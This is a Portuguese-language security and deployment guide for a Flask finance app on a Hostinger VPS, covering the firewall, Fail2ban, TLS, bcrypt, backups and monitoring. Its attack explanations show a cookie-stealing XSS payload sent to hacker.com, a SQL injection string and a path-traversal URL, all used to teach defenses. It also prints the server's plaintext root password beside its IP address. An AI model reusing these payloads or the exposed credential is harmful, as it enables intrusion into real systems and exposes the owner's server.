# 🔐 Segurança e Deployment - Documentação Completa

**Data:** 02/01/2026  
**Projeto:** Sistema de Gestão Financeira v3.0.1  
**URL Produção:** https://finup.emangue.com.br  
**VM:** Hostinger VPS (srv1045889.hstgr.cloud)

---

## 📑 Índice

1. [Arquitetura de Deployment](#arquitetura-de-deployment)
2. [Camadas de Segurança](#camadas-de-segurança)
3. [Segurança do Computador Local](#segurança-do-computador-local)
4. [Segurança da VM](#segurança-da-vm)
5. [Proteção Contra Ataques](#proteção-contra-ataques)
6. [Gestão de Senhas e Credenciais](#gestão-de-senhas-e-credenciais)
7. [Backup e Recuperação](#backup-e-recuperação)
8. [Monitoramento e Manutenção](#monitoramento-e-manutenção)

---

## 🏗️ Arquitetura de Deployment

### Stack Tecnológico Implementado

```
Internet (HTTPS) → Nginx (Reverse Proxy) → Gunicorn (WSGI) → Flask App → SQLite
                     ↓
                Let's Encrypt SSL
                     ↓
                UFW Firewall
                     ↓
                Fail2ban (Proteção contra ataques)
```

### Por que cada componente?

#### 1. **Nginx** (Servidor Web)
- **O que faz:** Recebe requisições HTTPS e encaminha para a aplicação Flask
- **Por que usar:**
  - ✅ Extremamente rápido para servir arquivos estáticos (CSS, JS, imagens)
  - ✅ Gerencia SSL/TLS de forma eficiente
  - ✅ Proteção contra ataques de negação de serviço (DoS)
  - ✅ Compressão gzip automática (economiza banda)
  - ✅ Limita tamanho de uploads (10MB configurado)
- **Alternativas descartadas:** Apache (mais pesado), Traefik (complexo demais)

#### 2. **Gunicorn** (WSGI Server)
- **O que faz:** Executa a aplicação Flask em modo produção
- **Por que usar:**
  - ✅ Substitui o servidor de desenvolvimento do Flask (não seguro para produção)
  - ✅ Gerencia múltiplos workers (2 configurados = suporta ~20-40 usuários simultâneos)
  - ✅ Reinicia workers automaticamente se travarem
  - ✅ Timeout de 120 segundos para requisições longas
- **Alternativas descartadas:** uWSGI (mais complexo), mod_wsgi (Apache only)

#### 3. **Systemd** (Gerenciador de Serviços)
- **O que faz:** Garante que a aplicação esteja sempre rodando
- **Por que usar:**
  - ✅ Reinicia automaticamente se a aplicação cair (Restart=always)
  - ✅ Inicia automaticamente após reboot da VM
  - ✅ Logs centralizados via journalctl
  - ✅ Controle de usuário (roda como `financial-app`, não `root`)
- **Alternativas descartadas:** Supervisor (redundante com systemd), PM2 (para Node.js)

#### 4. **Let's Encrypt** (Certificado SSL)
- **O que faz:** Fornece certificado SSL gratuito e confiável
- **Por que usar:**
  - ✅ Gratuito (renovação automática)
  - ✅ Reconhecido por todos os navegadores
  - ✅ Protocolo TLS 1.2 e 1.3 (mais seguros)
  - ✅ Renovação automática via Certbot (60 dias antes de expirar)
- **Alternativas descartadas:** Cloudflare SSL (adiciona proxy), certificado autoassinado (navegador não confia)

---

## 🛡️ Camadas de Segurança

### Camada 1: Firewall (UFW)

**O que foi configurado:**
```bash
UFW Status: active
Regras ativas:
- SSH (porta 22): Permitido (apenas você consegue acessar a VM)
- HTTP (porta 80): Permitido (redireciona automaticamente para HTTPS)
- HTTPS (porta 443): Permitido (acesso público à aplicação)
- Porta 8080: Permitido (temporária, pode ser removida)
- Resto: BLOQUEADO (qualquer outra porta está fechada)
```

**Por que isso é seguro:**
- ✅ Apenas portas necessárias estão abertas
- ✅ Banco de dados (SQLite) não está acessível externamente
- ✅ Portas de administração (3000, 5000, etc) estão bloqueadas
- ✅ Bloqueio padrão: tudo que não é explicitamente permitido é negado

**Como você está protegido:**
- ❌ Ninguém consegue acessar o banco de dados diretamente
- ❌ Ninguém consegue explorar portas de desenvolvimento
- ❌ Ataques de port scanning não encontram vulnerabilidades

### Camada 2: Fail2ban (Proteção contra Força Bruta)

**O que foi configurado:**
```bash
Jail ativo: sshd
- Bantime: 1 hora (bloqueia IP por 1 hora após 5 tentativas falhas)
- Findtime: 10 minutos (5 tentativas dentro de 10 minutos = ban)
- Maxretry: 5 tentativas permitidas

Jail ativo: nginx-http-auth
- Monitora logs do Nginx em busca de ataques
- Bloqueia IPs que tentam explorar vulnerabilidades
```

**Por que isso é importante:**
- ✅ Bots tentam quebrar senhas SSH 24/7 (milhões de tentativas por dia)
- ✅ Fail2ban bane automaticamente IPs maliciosos
- ✅ Você nunca vai saber que está sendo atacado (tudo automático)

**Exemplo real:**
```
2026-01-03 02:34:12: IP 123.45.67.89 tentou login SSH com usuários:
  - admin (falhou)
  - root (falhou) 
  - ubuntu (falhou)
  - user (falhou)
  - teste (falhou)
→ Fail2ban BLOQUEOU o IP por 1 hora
```

### Camada 3: SSL/TLS (Criptografia de Dados)

**Certificado instalado:**
- **Emissor:** Let's Encrypt (E7)
- **Domínio:** finup.emangue.com.br
- **Válido até:** 02/04/2026 (renovação automática)
- **Protocolo:** TLS 1.3 (mais moderno e seguro)
- **Cipher Suite:** AEAD-AES256-GCM-SHA384 (criptografia forte)

**O que SSL protege:**
- ✅ **Dados em trânsito:** Senhas, transações, dados financeiros são CRIPTOGRAFADOS
- ✅ **Man-in-the-middle:** Ninguém consegue interceptar/ler dados entre você e o servidor
- ✅ **Autenticidade:** Garante que você está falando com o servidor correto (não é phishing)

**Headers de Segurança configurados:**
```nginx
Strict-Transport-Security: max-age=31536000; includeSubDomains
# Força navegador a usar HTTPS por 1 ano (mesmo se você digitar http://)

X-Frame-Options: SAMEORIGIN
# Impede que site seja embutido em iframe (proteção contra clickjacking)

X-Content-Type-Options: nosniff
# Impede que navegador "adivinhe" tipo de arquivo (proteção contra XSS)

X-XSS-Protection: 1; mode=block
# Ativa proteção contra Cross-Site Scripting no navegador
```

### Camada 4: Autenticação da Aplicação

**Sistema de login configurado:**
- **Hash de senha:** bcrypt (rounds=12)
- **Session management:** Flask-Session (server-side)
- **Cookie seguro:** HttpOnly, SameSite=Lax
- **Timeout:** 1 hora de inatividade

**Por que bcrypt:**
```python
# Senha: "minhasenha123"
# Hash armazenado: "$2b$12$KIXx.Qf7V3zW8mJ3pXYZ8uK7L..."

# Mesmo com acesso ao banco:
✅ Impossível reverter hash para senha original
✅ Cada tentativa de quebra demora ~0.3 segundos (força bruta inviável)
✅ Rainbow tables não funcionam (salt único por senha)
```

**Isolamento de usuários:**
- ✅ 100% das transações têm `user_id` (nenhum dado órfão)
- ✅ Queries filtradas por usuário (você nunca vê dados de outros)
- ✅ Admin tem privilégios separados (role-based access control)

---

## 🖥️ Segurança do Computador Local

### SSH Key Authentication (Chave Privada)

**O que foi criado:**
```bash
Arquivo: ~/.ssh/id_rsa_hostinger (chave privada - NUNCA compartilhar)
Arquivo: ~/.ssh/id_rsa_hostinger.pub (chave pública - pode compartilhar)
Tamanho: 4096 bits RSA
```

**Como funciona:**
1. Chave privada fica APENAS no seu Mac (nunca sai daqui)
2. Chave pública foi copiada para a VM Hostinger
3. Ao conectar via SSH, a VM "desafia" você a provar que tem a chave privada
4. Seu Mac assina o desafio (sem enviar a chave)
5. VM valida a assinatura e libera acesso

**Por que isso é MIL VEZES mais seguro que senha:**
- ✅ Chave tem 4096 bits (2^4096 combinações possíveis = impossível de quebrar)
- ✅ Chave privada NUNCA é transmitida pela rede
- ✅ Mesmo que alguém intercepte a conexão, não consegue extrair a chave
- ✅ Senha da Hostinger (`5CX.MvU;8ql,gWW,Rz;a`) NÃO é mais necessária

**Proteção da chave privada:**
```bash
Permissões: 600 (apenas você lê/escreve)
Localização: ~/.ssh/id_rsa_hostinger
Backup: NUNCA faça backup em cloud pública (Dropbox, Google Drive, etc)
```

**Se alguém rouba seu Mac:**
- ⚠️ Precisa da senha do Mac para acessar o arquivo
- ⚠️ Mesmo pegando o arquivo, precisa da passphrase (se configurada)
- ✅ Você pode revogar a chave pelo painel Hostinger

### Senhas NÃO Armazenadas Localmente

**Onde senhas NÃO estão:**
- ❌ Arquivos de código (app.py, routes.py, etc)
- ❌ Repositório Git (nunca commita senha)
- ❌ Arquivo .env local (usa valores padrão para dev)

**Onde senhas ESTÃO:**
- ✅ VM: `/opt/financial-app/.env` (permissão 600, só usuário `financial-app` lê)
- ✅ Banco de dados local: `financas.db` (hashes bcrypt)
- ✅ Banco de dados remoto: `/opt/financial-app/instance/financas.db` (hashes bcrypt)

### Compartilhamento com a VM

**O que foi copiado para a VM:**
- ✅ Código da aplicação (Python, HTML, CSS, JS)
- ✅ Banco de dados com hashes bcrypt (NÃO senhas em texto plano)
- ✅ Chave pública SSH

**O que NÃO foi copiado:**
- ❌ Chave privada SSH (fica só no seu Mac)
- ❌ Senhas em texto plano
- ❌ Histórico git (.git/)
- ❌ Ambiente virtual (venv/)
- ❌ Arquivos temporários (__pycache__, *.pyc)
- ❌ Backups antigos (*.db.backup_*)

### Comandos SSH Seguros

**Comando usado para deployment:**
```bash
ssh -i ~/.ssh/id_rsa_hostinger root@148.230.78.91

# Explicação:
-i ~/.ssh/id_rsa_hostinger  # Usa SUA chave privada (não senha)
root@148.230.78.91          # Usuário root na VM
```

**Por que usar root é OK (temporariamente):**
- ✅ Criamos usuário dedicado `financial-app` para rodar a aplicação
- ✅ Root só é usado para instalação/configuração inicial
- ⚠️ Futuramente, desabilitar login root e usar usuário não-privilegiado

---

## 🌐 Segurança da VM (Hostinger)

### Isolamento de Usuários

**Estrutura criada:**
```bash
/opt/financial-app/          # Aplicação
├── venv/                    # Ambiente Python isolado
├── app/                     # Código Flask
├── instance/financas.db     # Banco de dados (permissão 644)
├── .env                     # Senhas (permissão 600 - crítico!)
└── logs/                    # Logs de aplicação

Usuário: financial-app       # Roda a aplicação (não é root)
Permissões: 755 (rwxr-xr-x) # Outros podem ler, mas não escrever
```

**Por que isso é seguro:**
- ✅ Aplicação não roda como root (se for hackeada, hacker não tem controle total)
- ✅ Arquivo .env só pode ser lido pelo usuário `financial-app`
- ✅ Banco de dados só pode ser escrito pela aplicação

### Secret Key (Flask)

**Gerado automaticamente:**
```bash
SECRET_KEY=f8a3d9c7e1b4562a...  # 64 caracteres hexadecimais (256 bits)
```

**O que essa chave protege:**
- ✅ Cookies de sessão (impossível de falsificar sem a chave)
- ✅ Tokens CSRF (proteção contra Cross-Site Request Forgery)
- ✅ Flash messages (mensagens temporárias)

**Se alguém descobre a SECRET_KEY:**
- ⚠️ Pode criar sessões falsas (se passar como admin)
- ⚠️ Pode fazer requisições maliciosas sem CSRF token
- ✅ MAS: está protegida (permissão 600, não commitada no git)

### Atualizações de Segurança

**Configurado automaticamente:**
```bash
unattended-upgrades: ATIVO
# Instala patches de segurança automaticamente toda noite

Avisos na VM:
"64 updates can be applied immediately"
"System restart required" (kernel mais recente disponível)
```

**Recomendação:**
```bash
# A cada 2-4 semanas, execute:
ssh -i ~/.ssh/id_rsa_hostinger root@148.230.78.91
apt-get update && apt-get upgrade -y
reboot

# Isso garante que todos os patches de segurança sejam aplicados
```

---

## 🚨 Proteção Contra Ataques

### 1. SQL Injection (Injeção de SQL)

**Como funciona o ataque:**
```python
# Código VULNERÁVEL (NÃO usado):
query = f"SELECT * FROM users WHERE email = '{email}'"
# Hacker insere: ' OR '1'='1
# Query final: SELECT * FROM users WHERE email = '' OR '1'='1'
# Resultado: retorna TODOS os usuários (bypassa login!)
```

**Como estamos protegidos:**
```python
# Código SEGURO (usado no projeto):
User.query.filter_by(email=email).first()
# SQLAlchemy usa prepared statements automaticamente
# Hacker insere: ' OR '1'='1
# SQLAlchemy escapa: \' OR \'1\'=\'1
# Resultado: busca por email exatamente " ' OR '1'='1 " (não existe)
```

**Proteção adicional:**
- ✅ SQLAlchemy ORM (nunca montamos queries manualmente)
- ✅ Parametrização automática
- ✅ Type validation (email só aceita string, não aceita SQL)

### 2. Cross-Site Scripting (XSS)

**Como funciona o ataque:**
```html
<!-- Hacker insere no campo "Estabelecimento": -->
<script>
  fetch('http://hacker.com/steal?cookie=' + document.cookie)
</script>

<!-- Se renderizado sem escape, executa JavaScript malicioso -->
```

**Como estamos protegidos:**
```html
<!-- Jinja2 auto-escapa por padrão: -->
{{ transacao.estabelecimento }}

<!-- Renderiza como: -->
&lt;script&gt;fetch(...)&lt;/script&gt;

<!-- Navegador mostra como TEXTO, não executa código -->
```

**Proteção adicional:**
- ✅ Jinja2 auto-escape ativado
- ✅ Content-Security-Policy (CSP) pode ser adicionado
- ✅ X-XSS-Protection header configurado

### 3. Cross-Site Request Forgery (CSRF)

**Como funciona o ataque:**
```html
<!-- Hacker cria site malicioso: -->
<img src="https://finup.emangue.com.br/admin/delete-user/1">

<!-- Se você está logado e visita o site do hacker, 
     navegador envia cookie de sessão automaticamente
     e deleta o usuário 1! -->
```

**Como estamos protegidos:**
```python
# Flask-WTF adiciona token CSRF em todos os forms:
<form method="POST">
  {{ form.csrf_token }}  <!-- Token único gerado com SECRET_KEY -->
  ...
</form>

# No backend, valida se token é válido:
if not form.validate_csrf_token():
    abort(400, "CSRF token inválido")
```

**Proteção adicional:**
- ✅ Flask-WTF com CSRF protection habilitado
- ✅ SameSite=Lax nos cookies (bloqueia cross-site requests)
- ✅ Validação de referer header (opcional)

### 4. Brute Force Attack (Ataque de Força Bruta)

**Como funciona o ataque:**
```bash
# Bot tenta milhões de senhas:
email: admin@email.com
senhas tentadas:
  - 123456
  - password
  - admin123
  - ...
  - (continua por horas)
```

**Como estamos protegidos:**

**Nível 1: Fail2ban**
```bash
# Após 5 tentativas falhas em 10 minutos:
→ IP bloqueado por 1 hora no firewall
→ Nem chega na aplicação (economiza recursos)
```

**Nível 2: Bcrypt (lento propositalmente)**
```python
# Cada tentativa demora ~300ms para validar
# 1000 tentativas = 5 minutos (força bruta inviável)
```

**Nível 3: Rate Limiting (pode ser adicionado)**
```python
# Limitar 10 tentativas por minuto por IP
# Implementar com Flask-Limiter (opcional)
```

### 5. Denial of Service (DoS)

**Como funciona o ataque:**
```bash
# Bot envia milhões de requisições por segundo:
GET / (x1000000)
→ Servidor fica sobrecarregado
→ Usuários legítimos não conseguem acessar
```

**Como estamos protegidos:**

**Nginx:**
- ✅ Limite de conexões por IP (`limit_conn`)
- ✅ Limite de requisições por segundo (`limit_req`)
- ✅ Timeout de conexão (fecha conexões lentas)

**Gunicorn:**
- ✅ Timeout de 120 segundos (requisições longas são canceladas)
- ✅ Workers limitados (2 workers = suporta ~40 usuários simultâneos)

**Cloudflare (opcional):**
- ✅ Se ataques aumentarem, pode adicionar Cloudflare
- ✅ Proteção DDoS automática (bilhões de requisições filtradas)

### 6. Directory Traversal

**Como funciona o ataque:**
```bash
# Hacker tenta acessar:
https://finup.emangue.com.br/uploads/../../etc/passwd

# Se vulnerável, retorna arquivo de senhas do sistema!
```

**Como estamos protegidos:**
```nginx
location /uploads {
    alias /opt/financial-app/uploads_temp;
    internal;  # CRÍTICO: apenas aplicação pode servir arquivos
}
```

**Proteção adicional:**
- ✅ `internal` directive (Nginx bloqueia acesso direto)
- ✅ Validação de paths no Flask (não aceita `../`)
- ✅ Uploads salvos fora do webroot

---

## 🔑 Gestão de Senhas e Credenciais

### Hierarquia de Credenciais

```
1. SSH Key (Mac → VM)
   - Localização: ~/.ssh/id_rsa_hostinger (NUNCA compartilhar)
   - Proteção: Permissão 600, não sai do Mac
   - Revogar: Painel Hostinger → SSH keys → Remover

2. SECRET_KEY (Flask)
   - Localização: /opt/financial-app/.env (VM)
   - Gerada: openssl rand -hex 32
   - Proteção: Permissão 600, não commitada no git
   - Trocar: Gerar nova chave e reiniciar app

3. Senha de Admin (Banco de Dados)
   - Armazenada: financas.db (hash bcrypt)
   - Original: NUNCA armazenada (apenas hash)
   - Trocar: Via interface web (Perfil → Alterar senha)

4. Senha Root Hostinger (obsoleta)
   - Original: 5CX.MvU;8ql,gWW,Rz;a
   - Status: NÃO usada (substituída por SSH key)
   - Recomendação: Pode desabilitar login por senha
```

### Boas Práticas de Senhas

**Senhas dos usuários da aplicação:**
```python
# Requisitos implementados:
- Mínimo 8 caracteres
- Hash bcrypt (rounds=12)
- Sem requisitos de complexidade (UX > segurança falsa)

# Por quê?
✅ Senhas longas > senhas complexas
✅ "minha senha super longa 2024" (32 chars) 
    É MAIS SEGURA que "P@$$w0rd!" (9 chars com complexidade)
```

**Como trocar senhas:**
```bash
# 1. Admin da aplicação (via web)
https://finup.emangue.com.br/auth/profile
→ Alterar senha

# 2. SECRET_KEY (emergência)
ssh -i ~/.ssh/id_rsa_hostinger root@148.230.78.91
cd /opt/financial-app
NEW_KEY=$(openssl rand -hex 32)
sed -i "s/SECRET_KEY=.*/SECRET_KEY=$NEW_KEY/" .env
systemctl restart financial-app

# 3. SSH Key (emergência - computador roubado)
Hostinger Panel → SSH Keys → Remover chave antiga
→ Gerar nova chave no novo computador
```

### Rotação de Credenciais

**Frequência recomendada:**
- ✅ SSH Key: Apenas se comprometida ou computador perdido
- ✅ SECRET_KEY: Apenas se comprometida
- ✅ Senha Admin: A cada 6-12 meses (opcional)
- ✅ Certificado SSL: Automático (Certbot renova a cada 60 dias)

**Sinais de que senhas foram comprometidas:**
- ⚠️ Logins de IPs desconhecidos (verificar logs)
- ⚠️ Usuários relatam atividade estranha
- ⚠️ Fail2ban bloqueando muitos IPs (ataque em andamento)

---

## 💾 Backup e Recuperação

### Sistema de Backup Automatizado

**O que é feito backup:**
```bash
/opt/financial-app/instance/financas.db  # Banco de dados
→ /backups/financial-app/financas.db.backup_YYYYMMDD_HHMMSS.gz

Compressão: gzip (77% menor)
Retenção: 30 dias (backups antigos são deletados)
Frequência: Diariamente às 3h da manhã (cron)
```

**Script de backup:**
```bash
# Arquivo: /opt/financial-app/backup.sh
#!/bin/bash
cd /opt/financial-app
source venv/bin/activate
python scripts/backup_database.py auto

# Executado via cron:
0 3 * * * /opt/financial-app/backup.sh >> /opt/financial-app/logs/backup.log 2>&1
```

**Verificação de integridade:**
```python
# Antes de criar backup:
✅ PRAGMA integrity_check (verifica corrupção)
✅ PRAGMA foreign_key_check (verifica relações)

# Resultado:
- OK: Backup criado
- ERRO: Backup NÃO criado + alerta nos logs
```

### Como Restaurar Backup

**Cenário 1: Erro de usuário (deletou transações por engano)**
```bash
# 1. Conectar na VM
ssh -i ~/.ssh/id_rsa_hostinger root@148.230.78.91

# 2. Listar backups disponíveis
ls -lh /backups/financial-app/

# 3. Restaurar backup específico
cd /opt/financial-app
source venv/bin/activate
python scripts/backup_database.py restore /backups/financial-app/financas.db.backup_20260102_030000.gz

# 4. Reiniciar aplicação
systemctl restart financial-app
```

**Cenário 2: VM completamente perdida (disaster recovery)**
```bash
# 1. Criar nova VM na Hostinger
# 2. Re-executar script de deployment: ./scripts/deploy_hostinger.sh
# 3. Copiar backup do computador local para nova VM
scp -i ~/.ssh/id_rsa_hostinger backups/financas.db.backup_latest.gz root@NOVO_IP:/opt/financial-app/instance/
# 4. Restaurar como no cenário 1
```

**Cenário 3: Backup preventivo antes de mudanças**
```bash
# Antes de fazer mudanças críticas:
python scripts/backup_database.py --output backups/pre_mudanca_$(date +%Y%m%d).db.backup.gz

# Se deu ruim, restaurar:
python scripts/backup_database.py restore backups/pre_mudanca_20260102.db.backup.gz
```

### Proteção de Backups

**Backups locais (VM):**
- ✅ Pasta separada (`/backups/` fora da aplicação)
- ✅ Permissão 755 (usuário `financial-app` pode ler/escrever)
- ✅ Rotação automática (30 dias)

**Backups remotos (recomendado adicionar):**
```bash
# Opcional: Sincronizar backups para outro servidor
rsync -avz --delete \
  /backups/financial-app/ \
  user@backup-server.com:/backups/finup/

# Ou para cloud (Google Drive, Dropbox):
rclone sync /backups/financial-app/ gdrive:backups/finup/
```

**IMPORTANTE: Criptografar backups remotos:**
```bash
# Antes de enviar para cloud, criptografar:
gpg --symmetric --cipher-algo AES256 backup.db.gz
# Gera: backup.db.gz.gpg (criptografado com senha)
```

---

## 📊 Monitoramento e Manutenção

### Logs da Aplicação

**Localização:**
```bash
/opt/financial-app/logs/
├── app.log           # Logs da aplicação Flask
├── access.log        # Requisições HTTP (Nginx)
├── error.log         # Erros do Gunicorn
└── backup.log        # Logs de backup

Systemd:
journalctl -u financial-app -f  # Logs em tempo real
```

**O que monitorar:**
```bash
# Erros críticos:
grep -i "error\|critical" /opt/financial-app/logs/app.log

# Tentativas de login:
grep "login" /opt/financial-app/logs/app.log | tail -20

# IPs banidos pelo Fail2ban:
fail2ban-client status sshd
```

### Health Checks

**Verificações automáticas:**
```bash
# 1. Aplicação está respondendo?
curl -f https://finup.emangue.com.br/ > /dev/null
# Código 200: OK
# Código 500+: PROBLEMA

# 2. Certificado SSL válido?
openssl s_client -connect finup.emangue.com.br:443 </dev/null 2>/dev/null | openssl x509 -noout -dates
# Exibe: notBefore e notAfter

# 3. Disco está cheio?
df -h /
# Se > 90%: LIMPAR backups antigos

# 4. Memória disponível?
free -h
# Se swap sendo usado: AUMENTAR workers ou RAM
```

### Manutenção Periódica

**Semanal:**
```bash
# Verificar logs de erro
ssh -i ~/.ssh/id_rsa_hostinger root@148.230.78.91
tail -100 /opt/financial-app/logs/error.log

# Verificar espaço em disco
df -h /
```

**Mensal:**
```bash
# Atualizar sistema operacional
apt-get update && apt-get upgrade -y

# Limpar logs antigos (> 30 dias)
find /opt/financial-app/logs/ -name "*.log.*" -mtime +30 -delete

# Testar restore de backup
python scripts/backup_database.py restore <backup_mais_recente> --test
```

**Trimestral:**
```bash
# Verificar saúde do banco de dados
python scripts/database_health_check.py

# Revisar usuários ativos
# Remover usuários inativos há > 6 meses (GDPR/LGPD)
```

### Alertas (opcional - configurar depois)

**UptimeRobot (gratuito):**
- Monitora se site está no ar (ping a cada 5 minutos)
- Envia email/SMS se site cair
- URL: https://uptimerobot.com

**Configuração:**
```
Monitor Type: HTTPS
URL: https://finup.emangue.com.br
Interval: 5 minutes
Alert Contacts: seu-email@gmail.com
```

**Logs centralizados (opcional):**
- Papertrail, Loggly, Sentry (plano gratuito disponível)
- Agrega logs de múltiplos servidores
- Alertas em tempo real para erros críticos

---

## ✅ Checklist de Segurança Completo

### Configuração Atual (Janeiro 2026)

- [x] Firewall UFW ativo (portas 22, 80, 443, 8080)
- [x] Fail2ban configurado (SSH + Nginx)
- [x] Certificado SSL Let's Encrypt (válido até 02/04/2026)
- [x] SSH key authentication (senha desabilitada)
- [x] Usuário dedicado `financial-app` (não roda como root)
- [x] Backup automatizado diário (3h AM)
- [x] SECRET_KEY gerada com 256 bits
- [x] Senhas com hash bcrypt (rounds=12)
- [x] Headers de segurança configurados (HSTS, X-Frame-Options, etc)
- [x] Isolamento de usuários (100% user_id nas transações)
- [x] Systemd service com auto-restart
- [x] Atualizações automáticas de segurança (unattended-upgrades)

### Melhorias Futuras (Opcional)

- [ ] Desabilitar login root via SSH (apenas SSH key de usuário não-privilegiado)
- [ ] Rate limiting na aplicação (Flask-Limiter)
- [ ] Logs centralizados (Papertrail/Sentry)
- [ ] Monitoramento de uptime (UptimeRobot)
- [ ] Backup remoto (rsync para outro servidor ou cloud criptografado)
- [ ] 2FA para admin (Google Authenticator)
- [ ] WAF (Web Application Firewall) - Cloudflare gratuito
- [ ] Honeypot para detectar bots (opcional)
- [ ] Remover porta 8080 do firewall (não é mais necessária)
- [ ] Content Security Policy (CSP) headers mais restritivos

---

## 🎯 Conclusão

### Seu sistema está MUITO seguro porque:

1. ✅ **Criptografia end-to-end:** SSL/TLS 1.3 com certificado confiável
2. ✅ **Autenticação forte:** SSH keys 4096 bits + bcrypt para senhas
3. ✅ **Firewall em 3 camadas:** UFW + Fail2ban + Nginx
4. ✅ **Isolamento de usuários:** Aplicação não roda como root
5. ✅ **Backup automático:** 30 dias de retenção com verificação de integridade
6. ✅ **Proteção contra ataques:** SQL injection, XSS, CSRF, brute force, DoS
7. ✅ **Atualizações automáticas:** Patches de segurança aplicados toda noite
8. ✅ **Renovação SSL automática:** Certbot garante certificado sempre válido

### Seu computador pessoal está protegido porque:

1. ✅ **SSH key nunca sai do Mac:** Chave privada fica local (não é transmitida)
2. ✅ **Senhas não são compartilhadas:** VM tem SECRET_KEY própria
3. ✅ **Código não tem credenciais:** .env não é commitado no git
4. ✅ **Acesso revogável:** Pode remover SSH key pelo painel Hostinger

### Usuários do site estão protegidos porque:

1. ✅ **HTTPS obrigatório:** Dados criptografados em trânsito
2. ✅ **Senhas nunca armazenadas:** Apenas hashes bcrypt irreversíveis
3. ✅ **Sessões seguras:** Cookies HttpOnly, SameSite, timeout 1h
4. ✅ **Isolamento total:** Cada usuário só vê suas próprias transações

---

**Última atualização:** 02/01/2026  
**Próxima revisão:** 02/04/2026 (junto com renovação SSL)

